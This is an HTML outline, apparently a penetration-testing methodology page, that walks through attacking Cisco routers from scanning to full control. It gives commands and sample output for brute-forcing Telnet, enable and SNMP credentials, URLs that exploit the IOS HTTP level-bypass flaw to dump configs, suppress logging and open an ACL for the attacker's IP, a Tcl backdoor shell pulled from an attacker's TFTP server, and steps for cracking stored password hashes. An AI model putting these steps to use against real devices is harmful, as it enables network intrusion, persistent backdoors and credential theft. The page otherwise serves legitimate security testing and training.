<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Tree</title>
</head><body><br/>
Sections: Scan/Fingerpring, password guessing, SNMP attacks, connect, check for bugs, config files<br/>
<br/>
Cisco Specific Testing<ul><li>Methodology</li>
<li style="list-style-type: none"><ul><li><img src="image.png" /> Scan &amp; Fingerprint.</li>
<li style="list-style-type: none"><ul><li></li>
<li>The purpose of 'Scan &amp; Fingerprint' is to identify open ports on the target device and attempt to determine the exact IOS version.??This then sets the plan for further attacks.</li>
<li></li>
<li></li>
<li>It Telnet is active, then password guessing attacks should be performed.</li>
<li></li>
<li>If SNMP is active, then community string guessing should be performed.</li>
</ul>
</li>
<li><img src="image 2.png" /> Credentials Guessing.</li>
<li style="list-style-type: none"><ul><li></li>
<li>If a network engineer/administrator has configured just one Cisco device with a poor password, then the whole network is open to attack.??Attempting to connect with various usernames/passwords is a mandatory step to testing the level of security that the device offers.</li>
<li></li>
<li></li>
<li></li>
<li>Attempt to guess Telnet, HTTP and SSH account credentials. Once you have non-privileged access, attempt to discover the 'enable' password. Also attempt to guess Simple Network Management Protocol (SNMP) community strings as they can lead to the config files of the router and therefore the 'enable' password!</li>
</ul>
</li>
<li><img src="image 3.png" /> Connect</li>
<li style="list-style-type: none"><ul><li></li>
<li>Once you have identified the access credentials, whether that be HTTP, Telnet or SSH, then connect to the target device to identify further information.</li>
<li></li>
<li></li>
<li>If you have determined the 'enable' password, then full access has been achieved and you can alter the configuration files of the router.</li>
</ul>
</li>
<li><img src="image 4.png" /> Check for bugs</li>
<li style="list-style-type: none"><ul><li></li>
<li>To check for known bugs, vulnerabilities or security flaws with the device, a good security scanner should be used</li>
<li></li>
<li style="list-style-type: none"><ul><li>The most widely knwon/ used are: Nessus, Retina, GFI LanGuard and Core Impact. </li>
<li>There are also tools that check for specific flaws, such as the HTTP Arbitrary Access Bug: ios-w3-vuln</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 5.png" /> Further your attack</li>
<li style="list-style-type: none"><ul><li></li>
<li>To further the attack into the target network, some changes need to be made to the running-config file of the target device. There are two main categories for configuration files with Cisco routers - running-config and startup-confg:</li>
<li></li>
<li style="list-style-type: none"><ul><li>running-config is the currently running configuration settings.  This gets loaded from the startup-config on boot.  This configuration file is editable and the changes are immediate.  Any changes will be lost once the router is rebooted.  It is this file that requires altering to maintain a non-permenant connection through to the internal network.  </li>
<li>startup-config is the boot up configuration file.  It is this file that needs altering to maintain a permenant  connection through to the internal network.  </li>
</ul>
</li>
<li></li>
<li>Once you have access to the config files, you will need enable (privileged mode) access for this, you can add an access list rule to allow your IP address into the internal network.???The following ACL will allow the defined &lt;IP&gt; access to any internal IP address. So if the router is protecting a web server and an email server, this ACL will allow you to pass packets to those IP addresses on any port.??Therefore you should be able to port scan them efficiently.</li>
<li></li>
<li style="list-style-type: none"><ul><li>#&gt; access-list 100 permit ip &lt;IP&gt; any</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 6.png" /> Scan &amp; Fingerprint.</li>
<li style="list-style-type: none"><ul><li>Port Scanning</li>
<li style="list-style-type: none"><ul><li>nmap</li>
<li style="list-style-type: none"><ul><li></li>
<span style="font-size: 16pt"><li>To effectively scan a Cisco device, both TCP and UDP ports across the whole range must be checked.</li>
<li>There are a number of tools that can achieve the goal, however we will stick with nmap examples.</li>
</span><li></li>
<li style="list-style-type: none"><ul><li></li>
<li>TCP scan: - This will perform a TCP scan, fingerprint, be verbose, scan ports 1-65535 against IP 10.1.1.1 and output the results in normal mode to TCP.scan.txt file. nmap??-sT??-O??-v??-p??1-65535??&lt;IP&gt;??-oN??TCP.scan.txt</li>
<li></li>
<li></li>
<li>UDP scan: - This will perform a UDP scan, be verbose,??scan ports 1.65535 against IP 10.1.1.1 and output the results in normal mode to UDP.scan.txt file. nmap??-sU??-v??-p??1-65535??&lt;IP&gt;??-oN??UDP.scan.txt</li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>Other tools</li>
<li style="list-style-type: none"><ul><li></li>
<li>ciscos is a scanner for discovering Cisco devices in a given CIDR network range.</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>Usage: ./ciscos &lt;IP&gt; &lt;class&gt; [option]</li>
</ul>
</li>
<li>mass-scanner is a simple scanner for discovering Cisco devices within a given network range.</li>
</ul>
</li>
</ul>
</li>
<li>Fingerprinting</li>
<li style="list-style-type: none"><ul><li></li>
<li>cisco-torch is a fingerprinter for Cisco routers.?There are a number of different fingerprinting switches, such as SSH, telnet or HTTP e.g.??The -A switch should perform all scans, however I have found it to be unreliable.</li>
<li></li>
<li style="list-style-type: none"><ul><li>BT cisco-torch-0.4b # cisco-torch.pl -A 10.1.1.175</li>
<li style="list-style-type: none"><ul><li></li>
<li>List of targets contains 1 host(s) 14489:??</li>
<li>Checking 10.1.1.175 ...</li>
<li>Fingerprint:2552511255251325525324255253311310</li>
<li>Description:Cisco IOS host (tested on 2611, 2950 and Aironet 1200 AP)</li>
<li>Fingerprinting Successful</li>
<li></li>
<li></li>
<li>Cisco-IOS Webserver found ?</li>
<li>HTTP/1.1 401 Unauthorized</li>
<li>Date: Mon, 01 Mar 1993 00:34:11 GMT</li>
<li>Server: cisco-IOS Accept-Ranges: none</li>
<li>WWW-Authenticate: Basic realm="level_15_access"</li>
<li>401 Unauthorized</li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>nmap version scan: - Once open ports have been identified, version scanning should be performed against them.??In this example, TCP ports 23 and 80 were found to be open.</li>
<li></li>
<li style="list-style-type: none"><ul><li>TCP Port scan - nmap -sV -O -v -p 23,80 &lt;IP&gt; -oN TCP.version.txt</li>
<li></li>
<li>UDP Port scan - nmap -sV -O -v -p 161,162 &lt;IP&gt; -oN UDP.version.txt</li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 7.png" /> Password Guessing.</li>
<li style="list-style-type: none"><ul><li></li>
<li>CAT (Cisco Auditing Tool): - This tool??extends beyond simple discovery and can perform dictionary based attacks against the Telnet server and SNMP agents.</li>
<li></li>
<li style="list-style-type: none"><ul><li>./CAT  -h  &lt;IP&gt;  -a  password.wordlist</li>
<li></li>
<li>BT cisco-auditing-tool-v.1.0 # CAT -h 10.1.1.175 -a /tmp/dict.txt</li>
<li>Guessing passwords:</li>
<li>Invalid Password: 1234</li>
<li>Invalid Password: 2read</li>
<li>Invalid Password: 4changes</li>
<li>Password Found: telnet</li>
<li></li>
</ul>
</li>
<li></li>
<li>brute-enabler is an internal enable password guesser.??You require valid non-privilege mode credentials to use this tool, they can be either SSH or Telnet.</li>
<li></li>
<li style="list-style-type: none"><ul><li>./enabler &lt;IP&gt; [-u username] -p password /password.wordlist [port]</li>
<li></li>
<li>BT brute-enable-v.1.0.2 # ./enabler??10.1.1.175??telnet??/tmp/dict.txt?</li>
<li>[`] OrigEquipMfr... wrong password</li>
<li>[`] Cisco... wrong password</li>
<li>[`] agent... wrong password</li>
<li>[`] all... wrong password</li>
<li>[`] possible password found: cisco</li>
<li></li>
</ul>
</li>
<li></li>
<li>hydra: - hydra is a multi-functional password guessing tool.??It can connect and pass guessed credentials for many protocols and services, including Cisco Telnet which may only require a password. (Make sure that you limit the threads to 4 (-t 4) as it will just overload the Telnet server!).</li>
<li></li>
<li style="list-style-type: none"><ul><li>BT tmp # hydra  -l  ""  -P  password.wordlist  -t  4  &lt;IP&gt;  cisco</li>
<li></li>
<li>Hydra (http://www.thc.org) starting at 2007-02-26 10:54:10 [DATA] 4 tasks, 1 servers, 59 login tries (l:1/p:59),</li>
<li>~14 tries per task [DATA] attacking service cisco on port 23</li>
<li>Error: Child with pid 21671 was disconnected - retrying (1 of 1 retries)</li>
<li>[STATUS] attack finished for 10.1.1.175 (waiting for childs to finish)</li>
<li>[23][cisco] host: 10.1.1.175???login:????password: telnet</li>
<li></li>
</ul>
</li>
</ul>
</li>
<li><img src="image 8.png" /> SNMP Attacks.</li>
<li style="list-style-type: none"><ul><li></li>
<li>CAT (Cisco Auditing Tool): - This tool??extends beyond simple discovery and can perform dictionary based attacks against the Telnet server and SNMP agents.</li>
<li></li>
<li style="list-style-type: none"><ul><li>./CAT  -h  &lt;IP&gt;  -w  SNMP.wordlist</li>
<li></li>
<li>BT cisco-auditing-tool-v.1.0# CAT -h 10.1.1.175 -w /tmp/snmp.txt</li>
<li>Checking Host: 10.1.1.175</li>
<li>Guessing passwords:</li>
<li>Invalid Password: cisco</li>
<li>Invalid Password: ciscos</li>
<li>Guessing Community Names:</li>
<li>Invalid Community Name: CISCO</li>
<li>Invalid Community Name: OrigEquipMfr</li>
<li>Community Name Found: Cisco</li>
<li></li>
</ul>
</li>
<li></li>
<li>onesixtyone is a reliable SNMP community string guesser.???Once it identifies the correct community string, it will display accurate fingerprinting information.</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>onesixytone  -c  SNMP.wordlist  &lt;IP&gt;</li>
<li>BT onesixtyone-0.3.2 # onesixtyone  -c  dict.txt  10.1.1.175 Scanning 1 hosts, 64 communities 10.1.1.175 [enable] Cisco Internetwork Operating System Software   IOS (tm) C2600 Software (C2600-IK9O3S3-M), Version 12.2(15)T17, RELEASE SOFTWARE (fc1)  Technical Support: http://www.cisco.com/techsupport  Copyright (c) 1986-2005 by cisco Systems, Inc.  Compiled Fri 12-Aug 10.1.1.175 [Cisco] Cisco Internetwork Operating System Software   IOS (tm) C2600 Software (C2600-IK9O3S3-M), Version 12.2(15)T17, RELEASE SOFTWARE (fc1)  Technical Support: http://www.cisco.com/techsupport  Copyright (c) 1986-2005 by cisco Systems, Inc.  Compiled Fri 12-Aug</li>
</ul>
</li>
<li></li>
<li>snmpwalk: - snmpwalk is part of the SNMP toolkit.??After a valid community string is identified, you should use snmpwalk to 'walk' the SNMP Management Information Base (MIB) for further information.??Ensure that you get the correct version of SNMP protocol in use or it will not work correctly.??It may be a good idea to redirect the output to a text file for easier viewing as the tool outputs a large amount of text.</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>snmapwalk  -v  &lt;Version&gt;  -c  &lt;Community string&gt;  &lt;IP&gt;</li>
<li></li>
<li>BT# snmpwalk -v 1 -c enable 10.1.1.1</li>
<li>SNMPv2-MIB::sysDescr.0 = STRING: Cisco Internetwork Operating System Software IOS (tm) C2600 Software (C2600-IK9O3S3-M), Version 12.2(15)T17, RELEASE SOFTWARE (fc1) Technical Support: http://www.cisco.com/techsupport Copyright (c) 1986-2005 by cisco Systems, Inc. Compiled Fri 12-Aug SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.9.1.185 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (363099) 1:00:30.99 SNMPv2-MIB::sysContact.0 = STRING: SNMPv2-MIB::sysName.0 = STRING: router SNMPv2-MIB::sysLocation.0 = STRING: SNMPv2-MIB::sysServices.0 = INTEGER: 78 SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00 IF-MIB::ifNumber.0 = INTEGER: 4</li>
<li></li>
</ul>
</li>
<li><a href="http://s-tech.elsat.net.pl/braa/">Braa</a> <a href="http://s-tech.elsat.net.pl/braa/"><img src="image 9.png" /></a></li>
<li style="list-style-type: none"><ul><li>./braa -v public@192.168.77.0-192.168.77.255:161:.1.3.6.1. 2.1.1.1.0</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 10.png" /> Connecting.</li>
<li style="list-style-type: none"><ul><li>Telnet</li>
<li style="list-style-type: none"><ul><li></li>
<li>The telnet service on Cisco devices can authenticate users based upon a password in the config file or against a RADIUS or TACACS server. If the device is simply using a VTY configuration for Telnet access, then it is likely that only a password is required to log on. If the device is passing authentication details to a RADIUS or TACACS server, then a combination of username and password will be required.</li>
<li></li>
<li style="list-style-type: none"><ul><li> telnet  &lt;IP&gt;</li>
<li>Sample Banners</li>
<li style="list-style-type: none"><ul><li></li>
<li>VTY configuration:</li>
<li>BT / # telnet 10.1.1.175</li>
<li>Trying 10.1.1.175...</li>
<li>Connected to 10.1.1.175.</li>
<li>Escape character is '^]'.</li>
<li>User Access Verification</li>
<li>Password:</li>
<li>router&gt;</li>
<li></li>
<li></li>
<li>External authentication server:</li>
<li>BT / # telnet 10.1.1.175</li>
<li>Trying 10.1.1.175...</li>
<li>Connected to 10.1.1.175.</li>
<li>Escape character is '^]'.</li>
<li>User Access Verification</li>
<li>Username: admin</li>
<li>Password:</li>
<li>router&gt;</li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>SSH</li>
<li>Web Browser</li>
<li style="list-style-type: none"><ul><li></li>
<li>HTTP/HTTPS: - Web based access can be achieved via a simple web browser, as long as the HTTP adminstration service is active on the target device:</li>
<li></li>
<li style="list-style-type: none"><ul><li>This uses a combination of username and password to authenticate.  After browsing to the target device, an "Authentication Required" box will pop up with text similar to the following:</li>
<li>Authentication Required Enter username and password for "level_15_access" at http://10.1.1.1 User Name: Password:</li>
<li>Once logged in, you have non-privileged mode access and can even configure the router through a command interpreter.</li>
<li style="list-style-type: none"><ul><li>Cisco Systems Accessing Cisco 2610 "router"</li>
<li style="list-style-type: none"><ul><li>Show diagnostic log - display the diagnostic log.</li>
<li>Monitor the router - HTML access to the command line interface at level 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</li>
<li></li>
<li>Show tech-support - display information commonly needed by tech support.</li>
<li></li>
<li></li>
<li>Extended Ping - Send extended ping commands.???</li>
<li></li>
<li>VPN Device Manager (VDM) - Configure and monitor Virtual Private Networks (VPNs) through the web interface.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>TFTP</li>
<li style="list-style-type: none"><ul><li></li>
<li>Trivial File Transfer Protocol is used to back up the config files of the router.??Should an attacker discover the enable password or RW SNMP community string, the config files are easy to retrieve.</li>
<li></li>
<li style="list-style-type: none"><ul><li></li>
<li>?Cain &amp; Abel -Cisco Configuration Download/Upload (CCDU)??With this tool the RW community string and the version of SNMP in use and running-config file can be downloaded to your local system.?</li>
<li></li>
<li>ios-w3-vuln exploits the HTTP Access Bug to 'fetch' the running-config to your local TFTP server.  Both of these tools require the config files to be saved with default names.</li>
</ul>
</li>
<li></li>
<li>There are ways of extracting the config files directy from the router even if the names have changed, however you are really limited by the speed of the TFTP server to dictionary based attacks.??Cisco-torch is one of the tools that will do this.??It will attempt to retrieve config files listed in the brutefile.txt file:</li>
<li></li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>./cisco-torch.pl &lt;options&gt; &lt;IP,hostname,network&gt;</li>
<li>./cisco-torch.pl &lt;options&gt; -F &lt;hostlist&gt;</li>
<li><a href="http://packetstormsecurity.org/papers/bypass/Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf">Creating backdoors in Cisco IOS using TCL</a> <a href="http://packetstormsecurity.org/papers/bypass/Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf"><img src="image 11.png" /></a></li>
<li style="list-style-type: none"><ul><li></li>
<li>en</li>
<li>router</li>
<li>source tftp tftp://&lt;Attacker_TFTP_SERVER&gt;/tclshell_ios.tcl</li>
<li></li>
<li>telnet &lt;router IP&gt;:Port</li>
<li><a href="http://www.vulnerabilityassessment.co.uk/tclshell_ios.tcl">tclshell</a> <a href="http://www.vulnerabilityassessment.co.uk/tclshell_ios.tcl"><img src="image 12.png" /></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 13.png" /> Known Bugs.</li>
<li style="list-style-type: none"><ul><li>Attack Tools</li>
<li style="list-style-type: none"><ul><li></li>
<li>Cisco Global Exploiter (CGE-13): - CGE is an attempt to combine all of the Cisco attacks into one tool.</li>
<li></li>
<li style="list-style-type: none"><ul><li></li>
<li>perl cge.pl &lt;target&gt; &lt;vulnerability number&gt;</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li></li>
<li>[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability</li>
<li></li>
<li></li>
<li>[2] - Cisco IOS Router Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[3] - Cisco IOS HTTP Auth Vulnerability</li>
<li></li>
<li></li>
<li>[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability</li>
<li></li>
<li></li>
<li>[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[6] - Cisco 675 Web Administration Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability</li>
<li></li>
<li></li>
<li>?[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[9] - Cisco 514 UDP Flood Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability</li>
<li></li>
<li></li>
<li>[11] - Cisco Catalyst Memory Leak Vulnerability</li>
<li></li>
<li></li>
<li>[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability</li>
<li></li>
<li>[13] - 0 Encoding IDS Bypass Vulnerability (UTF)</li>
<li>[14] - Cisco IOS HTTP Denial of Service Vulnerability</li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>HTTP Arbitrary Access vulnerability: - A common security flaw (of its time!) was/is the HTTP Arbitrary Access vulnerability.??This flaw allowed an external attacker to execute router commands via the web interface.??Cisco devices have a number of??privilege levels, these levels start at 0 (User EXEC) and go up to 100, although mostly only the first 15??are used.??Level 15 is Privileged EXEC mode, the same as enable mode.??By referring to these levels within the URL of the target device, an attacker could pass commands to the router and have them execute in Privilege EXEC mode.</li>
<li></li>
<li style="list-style-type: none"><ul><li>Web browse to the Cisco device: http://&lt;IP&gt;</li>
<li></li>
<li>Click cancel to the logon box and enter the following address:</li>
<li></li>
<li style="list-style-type: none"><ul><li></li>
<li>?http://&lt;IP&gt;/level/99/exec/show/config?(You may have to scroll through all of the levels from 16-99 for this to work.)</li>
<li></li>
</ul>
</li>
<li></li>
<li>To raise the logging level to only log emergencies:</li>
<li></li>
<li style="list-style-type: none"><ul><li>http://&lt;IP&gt;/level/99/configure/logging/trap/emergencies/CR</li>
</ul>
</li>
<li></li>
<li>To add a rule to allow Telnet:</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>http://&lt;IP&gt;/level/99/configure/access-list/100/permit/ip/host/&lt;Hacker-IP&gt;/any/CR</li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>ios-w3-vuln: - A CLI tool that automatically scrolls through all available privilege levels to identify if any are vulnerable to this attack, this tool is called ios-w3-vuln (although it may have other names.)??As well as identifying the vulnerable level, ios-w3-vuln will also attempt to TFTP download the running.config file to a TFTP server running locally.?</li>
<li></li>
<li style="list-style-type: none"><ul><li>./ios-w3-vul 192.168.1.1 fetch &gt; /tmp/router.txt</li>
</ul>
</li>
</ul>
</li>
<li>Common Vulnerabilities and Exploits (CVE) Information</li>
<li style="list-style-type: none"><ul><li>Vulnerabilties and exploit information relating to these products can be found here:http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cisco+IOS</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 14.png" /> Configuration Files.</li>
<li style="list-style-type: none"><ul><li></li>
<li>Configuration Files.</li>
<li>The relevant configuration files that control a Cisco router have already been covered in Methodology | (5) Further your attack. In the child to this entry is a sample running-config file from a Cisco 2600 router running IOS version 12.2.</li>
<li></li>
<li></li>
<li style="list-style-type: none"><ul><li>Configuration files explained</li>
<li style="list-style-type: none"><ul><li>The line that reads "enable password router", where "router" is the password, is the TTY console password which is superceeded by the enable secret password for remote access.</li>
<li></li>
<li>Telnet Access. If telnet is configured on the VTY (Virtual TTY) interface, then the credentials will be in the config file: line vty 0 4 password telnet login</li>
<li></li>
<li></li>
<li>SNMP Settings. If the target router is configured to use SNMP, then the SNMP community strings will be in the config file.??It should have the read-only (RO) and may have the read-write (RW) strings: snmp-server community Cisco RO snmp-server community enable RW</li>
<li></li>
<li>Password Encryption Utilised</li>
<li style="list-style-type: none"><ul><li></li>
<li>Enable password. The Holy Grail, the 'enable' password, the root level access to the router.??There are two main methods of storing the enable password in a config file, type 5 and type 7, MD5 hashed and Viginere encryption respectively. An example is:?enable secret 5 $1$c2He$GWSkN1va8NJd2icna9TDA.????</li>
<li></li>
<li style="list-style-type: none"><ul><li></li>
<li>Type 7 should be avoided as it is extremely easy to crack, it can even be done by hand!??An example Type 7 password is given below but does not exist in the example running-config file: enable password 7 104B0718071B17 They can be cracked with the following tools:?</li>
<li></li>
<li style="list-style-type: none"><ul><li><a href="http://bosondownload.com/utils/bos_getpass.exe">Boson GetPass</a> <a href="http://bosondownload.com/utils/bos_getpass.exe"><img src="image 15.png" /></a></li>
<li><a href="http://www.oxid.it/cain.html">Cain</a> <a href="http://www.oxid.it/cain.html"><img src="image 16.png" /></a></li>
<li><a href="http://www.ibeast.com/content/tools/CiscoPassword/index.asp">Online cracking</a> <a href="http://www.ibeast.com/content/tools/CiscoPassword/index.asp"><img src="image 17.png" /></a></li>
</ul>
</li>
<li></li>
<li>Type 5 password protection is much more secure.??However, should an attacker get hold of the configuration file somehow, then the MD5 hash can be extracted and cracked offline with the following tools:?</li>
<li></li>
<li style="list-style-type: none"><ul><li><a href="http://www.oxid.it/cain.html">Cain</a> <a href="http://www.oxid.it/cain.html"><img src="image 18.png" /></a></li>
<li><a href="http://www.openwall.com/john/">John the Ripper</a> <a href="http://www.openwall.com/john/"><img src="image 19.png" /></a></li>
<li style="list-style-type: none"><ul><li>Entered into a text file as follows: username:$1$c2He$GWSkN1va8NJd2icna9TDA.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>version 12.2</li>
<li>service config</li>
<li>service timestamps debug datetime msec</li>
<li>service timestamps log datetime msec</li>
<li>no service password-encryption</li>
<li>!</li>
<li>hostname vapt-router</li>
<li>!</li>
<li>logging queue-limit 100</li>
<li>enable secret 5 $1$c2He$GWSkN1va8NJd2icna9TDA.</li>
<li>enable password router</li>
<li>!</li>
<li>memory-size iomem 10</li>
<li>ip subnet-zero</li>
<li>no ip routing</li>
<li>!</li>
<li></li>
<li>ip audit notify log</li>
<li>ip audit po max-events 100</li>
<li>!</li>
<li>no voice hpi capture buffer</li>
<li>no voice hpi capture destination?</li>
<li>!</li>
<li>mta receive maximum-recipients 0</li>
<li></li>
<li>!</li>
<li>interface Ethernet0/0</li>
<li>?ip address 10.1.1.175 255.255.255.0</li>
<li>?no ip route-cache</li>
<li>?no ip mroute-cache</li>
<li>?half-duplex</li>
<li>!</li>
<li>interface Serial0/0</li>
<li>?no ip address</li>
<li>?no ip route-cache</li>
<li>?no ip mroute-cache</li>
<li>?shutdown</li>
<li>!</li>
<li>ip http server</li>
<li>no ip http secure-server</li>
<li>ip classless</li>
<li>!</li>
<li></li>
<li>snmp-server community Cisco RO</li>
<li>snmp-server community enable RW</li>
<li>snmp-server enable traps tty</li>
<li>call rsvp-sync</li>
<li>!</li>
<li>mgcp profile default</li>
<li>!</li>
<li>dial-peer cor custom</li>
<li>!</li>
<li>line con 0</li>
<li>line aux 0</li>
<li>line vty 0 4</li>
<li>password telnet</li>
<li>login</li>
<li>!</li>
<li>end</li>
<li></li>
</ul>
</li>
<li>Configuration Testing Tools</li>
<li style="list-style-type: none"><ul><li><a href="http://nipper.titania.co.uk%20/">Nipper</a> <a href="http://nipper.titania.co.uk%20/"><img src="image 20.png" /></a></li>
<li><a href="https://sourceforge.net/projects/fwauto">fwauto (Beta)</a> <a href="https://sourceforge.net/projects/fwauto"><img src="image 21.png" /></a></li>
<li><a href="http://search.cpan.org/~aaronsca/Cisco-CopyConfig-1.4/CopyConfig.pm">Cisco::CopyConfig</a> <a href="http://search.cpan.org/~aaronsca/Cisco-CopyConfig-1.4/CopyConfig.pm"><img src="image 22.png" /></a></li>
<li><a href="http://all.repository.backtrack-linux.org/pool/testing/">Copy Cisco Config</a> <a href="http://all.repository.backtrack-linux.org/pool/testing/"><img src="image 23.png" /></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><img src="image 24.png" /> References.</li>
<li style="list-style-type: none"><ul><li><a href="http://www.irmplc.com/content/pdfs/Cisco_IOS_Exploitation_Techniques.pdf">Cisco IOS Exploitation Techniques</a> <a href="http://www.irmplc.com/content/pdfs/Cisco_IOS_Exploitation_Techniques.pdf"><img src="image 25.png" /></a></li>
</ul>
</li>
</ul>
&nbsp; </body></html>